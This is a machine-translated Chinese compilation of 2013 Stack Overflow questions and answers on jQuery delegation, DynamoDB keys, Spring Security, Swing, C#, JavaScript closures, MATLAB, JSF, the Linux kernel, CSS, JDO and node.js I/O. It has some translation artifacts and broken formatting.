查看 NSEntityDescription 中的 insertNewObjectForEntityName，然后保存在 ManagedObjectContext 上。

# jquery - Jquery 不能通过 ajax 进行 $.ajax 第二个链接

> ID：15526512
> 
> 赞同：0
> 
> 时间：2013-03-20T14:34:46.163
> 
> 标签：jquery, navigation

我在单页网站上有以下代码：

```
 <section class="block" id="panel1">
    </section>
    <section class="block" id="panel2">
    <div class="loadcontent">
    <div class="vcard">
    [content here]
    <a href="detail1.html">Proceed to detail level1</a>
    </div>
    </div>
    </section>
    <section class="block" id="panel3">
    <div class="loadcontent">
    <div class="vcard">
    [content here]
    </div>
    </div>
    </section> 
```

我正在使用的 jquery 是这样的：

```
<script>
jQuery(function($) {
                $(".loadcontent").on("click","a",function(ev) {                   
                    ev.preventDefault();
                    var $el = $(this);
                    var $lc = $el.closest(".loadcontent");
                    URLtarget = $el.attr("href");

                    //alert("URL:"+URLtarget+"\nZIndex:"+zindex+"\nATTR:"+$el.className);
                    $.ajax({
                        url: URLtarget, 
                        data: {},
                        type: 'post',
                        error: function(XMLHttpRequest, textStatus, errorThrown){
                            alert('status:' + XMLHttpRequest.status + ', status text: ' + XMLHttpRequest.statusText);
                        },
                        success: function(data){
                            $lc.find(".vcard").fadeOut(1000,function() {                                
                            });                             
                            $lc.append(data);
                        }
                    });
                });
}); 
```

在`detail1.html`我有以下代码：

```
 <div class="vcard">
    <div><a href="#" class="closeme"> &times; CLOSE </a></div>
    [content here]
    <a href="detail2.html">Proceed to detail level1</a>
    </div> 
```

和 on`detail2.html`与 detail1 相同，但具有不同的内容模板（和数据）。当我启动第一个链接时，它可以正常加载 detail1.html，但是当我在 detail1.html 中单击 detail2.html 时，它会导致新页面（ajax 不起作用）。我认为 $.on() 正在“监听”dom 上的每个附加事件，正确的方法是什么？

我也尝试使用另一个 .on 作为`.closeme`链接，但它不起作用，它引导我到文档的顶部。

任何人都可以解释一下吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-20T14:50:10.647

所以实际上我找到了答案，在 SO 上被问到了不同的问题。

而不是`$(_selector_).on("click","a",function() { ... });` 它需要`$(document).on("click","_selector_ a",function() { ... });`

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-20T14:50:19.147

如果您正在生成`<section>`块，则不会为它们设置您的事件处理程序。请记住，当您使用`on`委托时，if 只能将事件处理程序附加*到当前存在于 DOM 中的元素*。`$(document).on()`如果您不知道将添加哪些元素，请使用。

# amazon-web-services - 为什么在 AWS DynamoDB 中使用通用哈希键是一件坏事？

> ID：15526514
> 
> 赞同：9
> 
> 时间：2013-03-20T14:34:47.037
> 
> 标签：amazon-web-services, nosql, amazon-dynamodb

我需要一种按时间戳排序项目的方法，因此我正在考虑使用通用哈希键和 unix 时间戳作为范围键。

根据常见问题解答：

```
When storing data, Amazon DynamoDB divides a table into multiple partitions and 
distributes the data based on the hash key element of the primary key. The provisioned 
throughput associated with a table is also divided among the partitions; each 
partition's throughput is managed independently based on the quota allotted to it. 
There is no sharing of provisioned throughput across partitions. 
```

由于我使用的是公共散列键，因此不会有不均匀的负载分布 - 因为所有负载都将进入单个分区。

所以当我提供`100 write`给这个分区时，所有的容量都将被使用，那么我认为这是一件好事，因为容量没有被浪费？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2013-03-20T17:02:12.540

您将写入和读取配置到 DynamoDB 表，而不是分区。您的容量在分区之间分布/共享，但由于底层硬件，每个分区也有固定的速率限制。

通过使用单个散列键，您将有一个固定的限制，即您可以在表上实际执行的读取和写入次数，而不管您要配置和支付多少次。

您无法将其扩展到该限制之上，因为 dynamodb 无法进一步对表进行分区以并行化负载处理，这是 AWS 随着您的预置数量增加而扩展系统的主要方式之一。

起初您可能不会达到该限制，但亚马逊建议不要使用这种方法，因为亚马逊希望您以可扩展的方式使用 AWS。

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2013-03-27T13:03:03.847

在您的情况下，一个常见的技巧是

*   `hash_key=%Y-%m-%d`（日期时间戳）
*   `range_key=iso-8601_timestamp+uuid`

这样，您的数据会按天跨分区拆分（假设从一天到另一天的负载相当均匀），但是 range 键允许非常精细`query`的条件调用`BETWEEN`。该`uuid`部分用于区分将在（完全）同时插入的记录。

# spring - Spring Security - REST API 和其他 URL 的单独配置

> ID：15526518
> 
> 赞同：5
> 
> 时间：2013-03-20T14:34:59.350
> 
> 标签：spring, spring-mvc, spring-security

我有两组 URL - 一组是 REST API，第二组是非常普通的网站。我想为 REST API 应用不同的安全规则，以便偶尔调用 REST API 的用户/脚本将使用 401 代码（基本身份验证很好）或仅 403 来回答。

所以我想允许访问 REST API：

*   已登录的用户（对于调用 REST API 的站点页面上的 javascript，因此共享相同的会话）。
*   一些在 WWW-Authenticate 标头中使用基本身份验证凭据调用 REST API 的脚本。

目前我正试图弄清楚什么配置会让spring“理解”我想要的。我想出了以下配置：

```
<beans:beans xmlns="http://www.springframework.org/schema/security"
             xmlns:beans="http://www.springframework.org/schema/beans"
             xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
             xsi:schemaLocation="
                http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans-3.1.xsd
                http://www.springframework.org/schema/security http://www.springframework.org/schema/security/spring-security-3.1.xsd">
    <http pattern="/" security="none" />
    <http pattern="/static/**" security="none" />

    <!-- REST API -->
    <http pattern="/rest/*" use-expressions="true">
        <http-basic />
        <intercept-url pattern="/*" access="isAuthenticated()" />
    </http>

    <!-- Site -->
    <http access-denied-page="/WEB-INF/views/errors/403.jsp" use-expressions="true">
        <intercept-url pattern="/index.html" access="hasRole('ROLE_USER') or hasRole('ROLE_ANONYMOUS')" />
        <intercept-url pattern="/login.html" access="hasRole('ROLE_USER') or hasRole('ROLE_ANONYMOUS')" />
        <intercept-url pattern="/admin/*" access="hasRole('ROLE_ADMIN')" />
        <intercept-url pattern="/**" access="hasRole('ROLE_USER')" />
        <form-login login-page="/login.html"
                    default-target-url="/index.html"
                    authentication-failure-url="/login.html?error=1" />

        <logout logout-url="/logout.do" logout-success-url="/index.html" />

        <anonymous username="guest" granted-authority="ROLE_ANONYMOUS" />
        <remember-me />
    </http>

    <authentication-manager>
        <authentication-provider>
            <user-service>
                <user name="admin" password="2" authorities="ROLE_ADMIN,ROLE_USER" />
                <user name="alex" password="1" authorities="ROLE_USER" />
            </user-service>
        </authentication-provider>
    </authentication-manager>
</beans:beans> 
```

不幸的是，不仅基本身份验证不适用于此配置，而且对于匿名用户发出的请求也没有 403 响应 - 应用程序回答重定向 302 Found，我想禁止 REST API url。

我尝试为 REST API 添加自定义入口点：

```
<beans:bean id="ep403" class="org.springframework.security.web.authentication.Http403ForbiddenEntryPoint"/>

<!-- REST API -->
<http pattern="/rest/*" entry-point-ref="ep403" use-expressions="true">
    <intercept-url pattern="/*" access="hasRole('ROLE_USER')" />
    <http-basic />
</http> 
```

但这也不起作用。

总结一下我想要得到的东西：

*   允许授权用户访问 REST API（授权工具应考虑 cookie 中的用户会话）。
*   如果脚本指定了正确的身份验证令牌并且未在 cookie 中指定会话，则允许脚本访问 REST API。

**更新**

在深入研究 Spring Security 内部之后，我发现了决定是否拒绝某些请求的代码。这就是所谓的“访问决策投票者”，基本上它们都适用于某个请求，如果链中的一个访问决策投票者投票拒绝访问某些资源，则该请求最终被拒绝。

因此，最初的问题可以通过引入特殊的访问决策投票器来解决，其行为方式如下：它尝试从会话中提取相关角色（如果请求中存在）并使用该角色继续授权步骤；如果不存在会话，它会尝试根据 WWW-Authenticate 标头中的凭据对用户进行身份验证，然后使用与给定用户关联的角色进行授权步骤。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2015-01-17T03:41:20.570

重新发布作为 bluish@ 建议的解决方案 :) 希望这会对某人有所帮助。

我找到了一个简单的解决方法。我只是将一个休息控制器映射到两组不同的 URL，并将每组分配给 spring 安全配置中不同的身份验证处理程序：

```
<!-- Defines custom security policy for Stateful REST API -->
<beans:bean id="nonRedirectingAccessDeniedHandler" class="org.springframework.security.web.access.AccessDeniedHandlerImpl"/>
<beans:bean id="forbiddenEntryPoint" class="org.springframework.security.web.authentication.Http403ForbiddenEntryPoint"/>

<!-- Stateful REST API -->
<http pattern="/rest/stateful/**" use-expressions="true" entry-point-ref="forbiddenEntryPoint">
    <access-denied-handler ref="nonRedirectingAccessDeniedHandler"/>
    <intercept-url pattern="/rest/stateful/**" access="isAuthenticated()" />
</http>

<!-- Stateless REST API -->
<http pattern="/rest/stateless/**" use-expressions="true" create-session="stateless">
    <http-basic/>
    <intercept-url pattern="/rest/stateless/**" access="isAuthenticated()" />
</http> 
```

它看起来是解决该问题的好方法，因为将来您可能希望使用特定于用户或脚本用例的唯一 URL 来扩展“有状态”用户或“无状态”脚本 REST API。

在我的情况下，当 UX 更改需要 REST API 提供一些旨在实现特定 UI 场景的新方法并且某些脚本场景可能需要添加一些 URL 来支持某些客户端脚本到服务器的交互时，可能会发生这种情况。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-03-21T06:28:38.280

您可以使用拦截器来检查具有`/rest/`模式的 URL。

```
<mvc:interceptors>
        <mvc:interceptor>
            <mvc:mapping path="/rest/**"/>
            <bean class="com.your.class.name.Interceptor></bean>
        </mvc:interceptor>
</mvc:interceptors> 
```

为此，在 XML 的标题部分添加以下行，即

```
<beans xmlns="http://www.springframework.org/schema/beans"
    xmlns:mvc="http://www.springframework.org/schema/mvc" 
```

现在在`Interceptor`课堂上检查你需要的任何东西，这个类应该实现 Spring `HandlerInterceptor`。

```
public class Interceptor implements HandlerInterceptor{

    @Override  
    public boolean preHandle(HttpServletRequest request,  
                             HttpServletResponse response,  
                             Object handler) throws Exception {
       //do what you need to check when the request arrives
       //do authentications here
       //return true if success
       //else false
    }

    @Override
    public void postHandle(HttpServletRequest request,
                           HttpServletResponse response, 
                           Object handler,
                           ModelAndView modelAndView) throws Exception {

    }

    @Override
    public void afterCompletion(HttpServletRequest request,
                                HttpServletResponse response, 
                                Object handler, 
                                Exception ex) throws Exception {    
    }

} 
```

阅读[本文](http://static.springsource.org/spring/docs/3.0.x/api/org/springframework/web/servlet/HandlerInterceptor.html)以获取有关这些方法的更多详细信息。[这个](http://www.mkyong.com/spring-mvc/spring-mvc-handler-interceptors-example/)也可以看

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-20T15:41:56.420

尝试更改为`pattern="/rest/*"`REST `pattern="/rest/**"`API ：`pattern="/*"``pattern="/**"`

```
<http pattern="/rest/**" use-expressions="true">
    <intercept-url pattern="/**" access="isAuthenticated()" />
    <http-basic />
</http> 
```

# java - 通过单击 jbutton 将元素从 jtextarea 添加到 jlist

> ID：15526521
> 
> 赞同：1
> 
> 时间：2013-03-20T14:35:03.723
> 
> 标签：java, swing, jlist, jtextarea, defaultlistmodel

我有一个 jtextfield，我可以在其中添加一个元素，然后单击一个按钮，我想将其添加到 jlist，现在我遇到的问题是，通过单击按钮，它将添加我想要的元素，但是当我添加另一个元素时列表中的元素，旧元素消失了，新元素出现在它的位置。这是我的代码：

```
 private void addActionPerformed(java.awt.event.ActionEvent evt) {                                    

    DefaultListModel  model1= new DefaultListModel();

    model1.addElement(desc.getText());
    jList2.setModel(model1);
    jList2.setSelectedIndex(0);
    desc.setText("");
} 
```

任何人都可以帮助我吗？谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-20T14:38:27.683

每次单击按钮时，您都会创建一个新的 DefaultListModel 并将元素添加到这个全新的列表中。因此，您不能将它们全部添加到同一个列表中。

而是在方法之外定义您的 DefaultListModel model1`addActionPerformed`并使用对内部对象的引用，如下所示：

```
DefaultListModel  model1= new DefaultListModel();

private void addActionPerformed(java.awt.event.ActionEvent evt) {                                     
      model1.addElement(desc.getText());
      jList2.setModel(model1);
      jList2.setSelectedIndex(0);
      desc.setText("");

} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-20T14:37:10.110

`JList`每次单击 时，您都在更换模型`JButton`。相反，您可以在启动时在类级别使用单个`DefaultListModel`并添加到其中。

*   [例子](http://www.java2s.com/Code/Java/Swing-JFC/AnexampleofJListwithaDefaultListModel.htm)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-20T14:40:18.777

```
// Only once (may be in constructor),
// don't put this code in ActionListener method actionPerformed().
DefaultListModel model1 = new DefaultListModel(); 
```

其余代码不变。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-03-20T14:41:38.490

```
 listModel = new DefaultListModel();
    listModel.addElement("Jane Doe");
    listModel.addElement("John Smith");
    listModel.addElement("Kathy Green");

    list = new JList(listModel);
public void actionPerformed(ActionEvent e) {
    int index = list.getSelectedIndex();
    listModel.remove(index);

    int size = listModel.getSize();

    if (size == 0) { //Nobody's left, disable firing.
        fireButton.setEnabled(false);

    } else { //Select an index.
        if (index == listModel.getSize()) {
            //removed item in last position
            index--;
        }

        list.setSelectedIndex(index);
        list.ensureIndexIsVisible(index);
    }
} 
```

# c# - 获取 MDIChild 的控件

> ID：15526529
> 
> 赞同：1
> 
> 时间：2013-03-20T14:35:21.187
> 
> 标签：c#

我创建了一个具有 RichtTextBox 的新 MDIChild：

```
Form myForm = new Form();
myForm.MdiParent = this;
RichTextBox rtb = new RichTextBox();
myForm.Controls.Add(rtb);
myForm.Show(); 
```

由于可能打开了其他一些没有 RTB 的 MDIChild，我想检查 ActiveChild 中是否有 RichtTextBox。我不知道该怎么做......在try-catch（？）中是这样的：

```
foreach (Control control in this.ActiveMdiChild.Controls)
{
    // check if the control is a checkbox
    // make the richttextbox as an object so I can do strange things with it ^^
} 
```

你能帮帮我吗？

谢谢和干杯亚历克斯

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-20T14:43:26.383

您可以`RichTextBox`使用`is`运算符检查控件是否为 a：

```
foreach (Control control in this.ActiveMdiChild.Controls)
{
    if (control is RichTextBox)
    {
        RichTextBox rtfChild = (RichTextBox)control;
        // From here on you can use rtfChild as any other RichTextBox control.
    }
} 
```

当然，您也可以将其用于任何其他类型的控件。

检查子表单是否有`RichTextBox`：

```
bool found = false;
foreach (Control control in this.ActiveMdiChild.Controls)
{
    if (control is RichTextBox)
    {
        found = true;
        break;
    }
}

if (found)
{
} 
```

如果将它放在返回`RichTextBox`控件的方法中，则可以让该方法检查子窗体是否具有`RichTextBox`，如果有，则返回它，否则返回`null`。

# javascript - Closure Conditional - 当这个返回函数没有作为参数传递时，它如何获取设置为参数的值？

> ID：15526530
> 
> 赞同：1
> 
> 时间：2013-03-20T14:35:25.463
> 
> 标签：javascript, closures

因此，`return function (n)`仍然返回最初作为增补赋予其父函数的值。但是我不明白为什么，当我没有传递 n 的值时，`var digit_name = (function(){`确实`return function(n){`从原始参数中获取了它的值。

特别是当我用`var n = 4;`

**JS**

```
 var digit_name = (function(){
       var names;
       var n = 4;
       return function(n){
           if(!names){
               names = ['zero','one','two','three'];
           }
       return names[n];
       }
   }());
   console.info(digit_name(3)); //Three 
```

`return function(n)`另外，如果我用数字覆盖，`return function(1)`我会`SyntaxError: missing formal parameter`。我知道 return names[n] 不会知道什么`n`，那么为什么不给出`n is undefined`错误呢？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-20T14:43:07.493

我不完全确定你在问什么，所以我只想解释为什么你会得到你所做的输出......

当代码运行时，IIFE（立即调用的函数表达式）被执行并`digit_name`引用从它返回的函数。该函数仍然可以通过闭包访问外部变量`n`和变量。`names`

然后你调用`digit_name`并传递一个参数。`digit_name`is的形式参数`n`，它隐藏`n`在外部范围中的声明。不再有任何方法可以引用该 external `n`。所以你传入的任何值`digit_name`都会被使用。

实际上，在这种情况下，IIFE 毫无意义（除了它可以防止您在每次调用函数时都必须创建数组），并且您的代码与此等价，除了数组差异：

```
var digit_name = function (n) {
    return ['zero','one','two','three'][n];
};
console.info(digit_name(3)); // "three" 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-20T14:41:23.410

如果您在控制台中查看 digit_name 的定义，您会看到它是这个函数：

```
 function (n){
       if(!names){
           names = ['zero','one','two','three'];
       }
       return names[n];
   } 
```

所以你没有覆盖 n，因为这个函数中 n 的范围现在是参数 n，而不是上面声明的变量。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-03-20T14:41:38.873

在您的示例中，您与变量存在命名和范围冲突`n`。外部函数中定义`var n`的赋值为 4。您的内部函数接受一个声明为 的参数`n`。因此，`n`您的内部函数中的变量是指其内部范围，而不是`var n`在外部函数中引用。如果需要默认值，可以将外部变量命名为不同的名称，并检查`n`内部函数中是否存在该值：

```
var digit_name = (function () {
    var names;
    var defaultn = 0;
    return function (n) {
        if (!n) n = defaultn;
        if (!names) {
            names = ['zero', 'one', 'two', 'three'];
        }
        return names[n];
    }
}());
console.info(digit_name(3)); //Three
console.info(digit_name()); //zero 
```

# matlab - 比较多个图像

> ID：15526534
> 
> 赞同：0
> 
> 时间：2013-03-20T14:35:39.857
> 
> 标签：matlab, file-io, comparison

我编写了一个 matlab 函数，使我能够从用户那里获取图像的名称，并将其与现有图像进行比较，并显示是否匹配。

```
function matchin
handles = guidata(gcbo);
set(handles.h_text,'String','performing matching...');
[image1, pathname]= uigetfile('*.bmp','Open An Fingerprint image');
Directory = fullfile ('F:','matlab','bin');
D = dir(fullfile(Directory,'*.bmp'));
set(handles.h_text,'String','matching complete....');
for i = 1:numel(D)
   if strcmp(image1,D(i).name)
       disp('matched');
   else       
        disp('not matched');
   end

end 
```

上面的代码检查文件名是否存在，但我现在想比较图像本身而不是文件名。我该怎么做？请帮助..

问候

普里亚

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-20T15:45:47.257

你的函数应该是这样的：

```
function image1=matchin

[image1, pathname]= uigetfile('*.bmp','Open An Fingerprint image');
Directory = fullfile ('F:','matlab','bin');
D = dir(fullfile(Directory,'*.bmp'));
imcell = {D.name}';
for i = 1:numel(D)
  if strcmp(image1,imcell{i})
  disp('matched');
else
    disp('not matched');
  end
end

end 
```

您可以使用`{D.name}'`. 至少当我在带有图像的文件夹中尝试它时，它对我来说就是这样。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-20T15:33:24.980

使用`strcmp`而不是`==`比较未知长度的字符串。您可以将其更改`for loop`为：

```
D = dir(Directory);
for i = 1:numel(D)
   if strcmp(image1,D(i).name)
       disp('matched');
   else
       disp('not matched');
   end
end 
```

# jsf - 读取 bean 属性的立即评估与延迟评估

> ID：15526536
> 
> 赞同：6
> 
> 时间：2013-03-20T14:35:41.697
> 
> 标签：jsf, el, managed-bean

我还不清楚JSF `immediate evaluation`vs的使用方法`deferred evaluation`，主要是网上的例子几乎没有使用过前一种方法。

我已经看过相当多的 JSF 示例，包括[http://docs.oracle.com/javaee/6/tutorial/doc/](http://docs.oracle.com/javaee/6/tutorial/doc/)中包含的示例，我对我几乎只看到过与`#{}`而不是`${}`, 即使我们所做的只是读取一个 bean 属性。

从我对这两种用途的理解来看，`${}`只能用来读取bean属性，不能用来写。我还没有找到一个明确的解释，说明`immediate`vs`deferred`评估在 JSF 生命周期方面的确切差异以及读取 bean 属性会产生什么差异。

如果大家总是使用`#{}`来读取 bean 属性，你会推荐什么时候使用`${}`？

所以，总结一下：

*   为什么每个人在阅读 bean 属性时似乎`#{}`都*更*喜欢`${}`？
**   你什么时候建议使用`${}`代替`#{}`？*   你能给我一个例子，说明 using`${}`与 using`#{}`的结果不同（你能解释为什么结果不同）吗？*

 ** * *

## 回答 #1

> 赞同：9
> 
> 时间：2013-03-20T14:41:00.527

在 Facelets 中，`${}`被视为`#{}`，因此在技术上没有区别，它总是被延迟。

在 JSP 2.0 和更早版本中，`${}`当托管 bean 不在范围内时，它不会自动创建它。因此，只有当您可以保证*之前*在组件树中的`#{}`某处使用过同一个托管 bean并且还考虑了[视图构建时间与视图渲染时间](https://stackoverflow.com/a/3343681/)生命周期时，您才能使用它。在所有 JSP 版本中，不能在模型中设置 JSF 输入组件的提交值。总而言之，将它们混合起来可能会让初学者感到困惑，从长远来看，甚至对你自己也是如此，因此不推荐。*`${}`*

 *### 也可以看看：

*   [JSP EL、JSF EL 和 Unified EL 的区别](https://stackoverflow.com/questions/4812755/difference-between-jsp-el-jsf-el-and-unified-el)**

# linux - Linux内核源中定义的_PAGE_OFFSET值在哪里

> ID：15526538
> 
> 赞同：0
> 
> 时间：2013-03-20T14:35:51.057
> 
> 标签：linux, linux-kernel, bootstrapper

从我的 linux 内核（vmlinux.lds）链接器文件中，我知道 _PAGE_OFFSET 的值为 0xc0000000 但由于某些原因，我想更改此值，但无法找出该值来自哪个宏。

所以我想 _PAGE_OFFSET 的值来自哪个文件。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-03-20T14:42:58.513

“下划线”前缀的那些是特定于架构的，并且只存在于几个架构中。它们位于 arch 目录中，例如：

```
arch/x86/include/asm/page_32_types.h 
```

一般来说，您不应该使用它们 - 并且应该使用更通用的：

```
PAGE_OFFSET 
```

它在所有架构类型中定义，在：

```
include/asm-generic/page.h 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2019-03-17T03:45:40.750

以 x86 架构为例。

```
arch/x86/include/asm/page_types.h :
#define PAGE_OFFSET     ((unsigned long)__PAGE_OFFSET)

arch/x86/include/asm/page_32_types.h :
#define __PAGE_OFFSET       _AC(CONFIG_PAGE_OFFSET, UL)

arch/x86/Kconfig:

config PAGE_OFFSET
    hex
    default 0xB0000000 if VMSPLIT_3G_OPT
    default 0x80000000 if VMSPLIT_2G
    default 0x78000000 if VMSPLIT_2G_OPT
    default 0x40000000 if VMSPLIT_1G
    default 0xC0000000
    depends on X86_32 
```

arch/x86/Kconfig 中的 PAGE_OFFSET 是 page_32_types.h 中的 CONFIG_PAGE_OFFSET。因为前缀'CONFIG_'是*make system*自动添加的。

# css - CSS 和 IE 8 和 7

> ID：15526543
> 
> 赞同：0
> 
> 时间：2013-03-20T14:35:59.690
> 
> 标签：css, internet-explorer, cross-browser

我这里有这个网站

[http://heyheyandco.com/](http://heyheyandco.com/)

它在 Chrome、Firefox、IE 9、iPhone 和 iPad 上看起来不错。

在 IE 8 和 7 中，一切似乎都在中间被碾压了……有人知道为什么会这样吗？

这是正在处理的位的代码

```
.site {
    box-shadow: 0 2px 6px rgba(100, 100, 100, 0.3);
    margin: 48px auto;
    max-width: 960px;
    overflow: hidden;
    padding: 0 40px;
}

<div class="hfeed site" id="page"> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-20T14:40:32.863

这实际上更像是一个视觉问题，因为您正在应用不同颜色的背景`ie.css`

尝试这样做`ie.css`：

```
body {
   background: #000;
} 
```

这应该使它看起来正确。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-20T14:39:34.690

我认为您可能需要针对不同版本的 IE 使用不同的 CSS 方法。您使用的代码在旧版本的浏览器中不可用。

此处有更多详细信息[如何使用有效的 CSS 以 IE7 和 IE8 为目标？](https://stackoverflow.com/questions/814219/how-does-one-target-ie7-and-ie8-with-valid-css)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-20T14:42:36.140

转到body标签，黑色背景在ie 7中就可以了，我在这里测试了面值。

# javascript - JavaScript！window.onload = someFunction 和 window.onload = someFunction()

> ID：15526544
> 
> 赞同：2
> 
> 时间：2013-03-20T14:36:02.180
> 
> 标签：javascript

有没有区别：

1.  `window.onload = someFunction;`

2.  `window.onload = someFunction();`

最后的括号。他们有什么不同吗？

我们一般用第一个！如果我们必须向函数传递一些参数怎么办。我们将如何使用第一个语句来做到这一点？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-03-20T14:42:50.940

如另外解释的，第一种形式

```
window.onload = someFunction 
```

只需将“onload”变量设置为等于“someFunction”函数；当页面完成加载时，调用此函数。

另一种形式：

```
window.onload = someFunction() 
```

将“onload”变量设置为调用 someFunction 的*结果*。除非“someFunction”本身返回一个函数，否则这可能不是您想要做的。

默认情况下，使用单个“事件”参数调用 onload 函数。如果你想传递参数，你可以这样做：

```
window.onload = function (event) {
  someFunction(someArg, someOtherArg)
} 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-03-20T14:40:12.050

您的第二条语句将**结果**分配给`someFunction()`to `window.onload`。

如果要添加参数，可以执行以下操作：

```
window.onload = function () {
    someFunction(parameter);
}; 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-03-20T14:36:46.533

`window.onload = someFunction;`将函数分配给`onload`。

`window.onload = someFunction();` **调用**一个函数并将其返回值分配给`onload`. （除非该函数的返回值是另一个函数，否则这是不可取的）。

> 如果我们必须将一些参数传递给函数怎么办

通常你定义一个新函数，除了用一些参数调用原始函数之外什么都不做，然后你将新函数分配给事件处理程序。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-03-20T14:37:32.140

如果你使用

```
window.onload = someFunction; 
```

在 window.onload 上调用了一个名为 someFunction 的函数

如果你使用

```
window.onload = someFunction(); 
```

someFunction() 运行并将结果分配给 window.onload

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-03-20T14:38:58.933

是的。如果你把`window.onload = someFunction()`它预期的结果`someFunction()`是另一个函数。这可用于包装函数或传递参数。例如：

```
window.onload = myFunction(arg1, arg2) 
```

`myFunction(arg1, arg2)`预计会返回一些包含这两个变量的函数。

# google-app-engine - 查询未在同一事务中找到持久对象

> ID：15526545
> 
> 赞同：0
> 
> 时间：2013-03-20T14:36:07.610
> 
> 标签：google-app-engine, transactions, persistence, jdo

我有看起来像这样的域对象：

```
@PersistenceCapable(detachable="true")
public class UserData implements java.io.Serializable
{
    @PrimaryKey
    @Persistent(valueStrategy = IdGeneratorStrategy.IDENTITY)
    private Long id;

    @Persistent
    @NotNull
    private String openId;

    public UserData(String openId)
    {
        this.openId = openId;
    }
} 
```

现在我创建一个 UserData 对象并使用 JDO 使其持久化：

```
UserData userData = ThreadLocalPMF.getPersistenceManager().makePersistent(new UserData(openId)); 
```

稍后在代码中，我使用相同的 PersistenceManager，相同的线程在同一个仍然打开的事务中进行查询：

```
Query query = ThreadLocalPMF.getPersistenceManager().newQuery(UserData.class, "openId == :openId");
query.setUnique(true);
UserData userData = (UserData)query.execute(openId); 
```

现在发生了一次查询确实返回了 null 而不是之前在几行代码中持久化的对象。这里有什么问题？这是一个一致性问题吗？该应用程序正在使用 High Replication Datastore

```
<property name="datanucleus.appengine.datastoreEnableXGTransactions" value="true"/> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-21T18:37:10.507

在 GAE 事务中，事务中的所有查询都会在事务开始时看到数据存储状态的快照。查询不会返回在事务中修改的任何新的或更新的实体，您必须自己跟踪。

您应该返回事务查询的文档以获取更多详细信息。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-21T00:45:59.153

当持久化带有 id 变量的对象时：

```
@Persistent(valueStrategy = IdGeneratorStrategy.IDENTITY) 
```

目前我不能 100% 确定它会使用提供的 ID 保存对象。但我认为它将使用完全不同的 ID 值保存对象，因为它遵循`valueStrategy`.

为了解决这个问题，**在保存对象之后**，在从方法返回之前获取它的 ID，保留 ID 以便稍后查找对象。

# javascript - 关于node.js内部异步I/O机制的困惑

> ID：15526546
> 
> 赞同：24
> 
> 时间：2013-03-20T14:36:09.057
> 
> 标签：javascript, linux, node.js, io, libuv

1.  我了解到 node.js 在内部使用 libeio 在 *nix 平台上使用线程池执行异步**文件**I/O，对吗？
2.  异步**网络**I/O 呢？它是由libev完成的吗？还有线程池吗？
3.  如果里面有线程池，怎么会比传统的请求一个线程的模型更高效呢？每个 I/O 请求一个线程吗？
4.  windows上的机制是什么？我知道它是由 IOCP 完成的，并且有一个内核级别的线程池，对吧？
5.  为什么linux还没有像windows IOCP这样原生的完全AIO机制呢？将来会有吗？

根据changchang的回答更新：

1.  我快速查看了@changchang 给出的[源代码](https://github.com/libuv/libuv/blob/780c08a63efb65aed65da57c36f1c5b10f25cc1d/src/threadpool.c)，发现默认线程池大小可以通过**UV_THREADPOOL_SIZE**重置，我想知道在哪种情况下会使用它？
2.  我也发现getaddrinfo用了这个线程池，除了fs还有吗？如果所有同步作业都在这个线程池中完成，那么默认大小“4”是否足够？
3.  据我现在的理解，node.js 进程中将有 6 个基本线程：1 个 V8 线程（事件循环，用户 javascript 代码运行的地方）、1 个 libuv 事件循环和线程池中的 4 个，对吗？
4.  我怎样才能在我的外壳（Ubuntu）中看到这些线程？我使用**ps -eLf | grep 节点 | grep -v grep**只看到两个：

    根 16148 7492 16148 0 2 20:43 pts/26 00:00:00 ./bin/node /home/aaron/workspace/test.js
    根 16148 7492 16149 0 2 20:43 pts/26 00:00:00 。 /bin/node /home/aaron/workspace/test.js

* * *

## 回答 #1

> 赞同：30
> 
> 时间：2013-03-21T08:39:19.323

1.  首先，`libuv`已从中删除`libeio`。`libeio`但它确实像您提到的那样使用线程池执行异步文件 I/O 。

2.  `libuv`也删除`libev`. 它基于不同平台的异步 I/O 接口进行异步网络 I/O，例如`epoll`、`kqueue`和`IOCP`，没有线程池。有一个在主线程上运行的事件循环，`uv`它轮询 I/O 事件并处理它们。

3.  里面的线程池`libuv`是一个固定大小的线程池（[uinx like system 4](http://docs.libuv.org/en/v1.x/threadpool.html)）。它执行任务队列角色，并通过在请求增加时无限生成线程来避免系统资源的耗尽。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-03-22T20:37:59.940

Uptil 0.6 版节点用于`libev`运行事件循环和`libeio`异步 I/O（Unix 后端大量依赖这两个库）。但`libuv`已开始替换`libev`并`libeio`在[0.8 版本](http://blog.nodejs.org/2012/06/25/node-v0-8-0/)中。它执行、维护和管理事件池中的所有 io 和事件。[`libuv`](http://blog.nodejs.org/2011/09/23/libuv-status-report/)是跨平台异步IO库的选择。

